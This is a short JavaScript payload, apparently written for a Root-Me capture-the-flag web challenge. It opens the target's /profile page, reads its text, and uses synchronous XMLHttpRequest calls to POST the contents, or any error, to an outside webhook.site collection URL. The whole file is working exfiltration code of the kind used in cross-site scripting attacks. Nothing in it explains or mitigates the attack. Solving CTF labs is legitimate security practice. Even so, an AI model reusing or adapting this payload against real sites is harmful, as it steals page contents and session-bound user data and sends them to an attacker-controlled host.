// https://tim-xd.github.io/web-client/index.html

const PROFILE = "http://challenge01.root-me.org:58003/profile";
const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651?";

function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

try {
  const o = window.open(PROFILE);
  if (o === null) post(WEBHOOK, "null");
  else post(WEBHOOK, o.document.body.innerText);
} catch (error) {
  post(WEBHOOK, `Error: ${error}`);
}
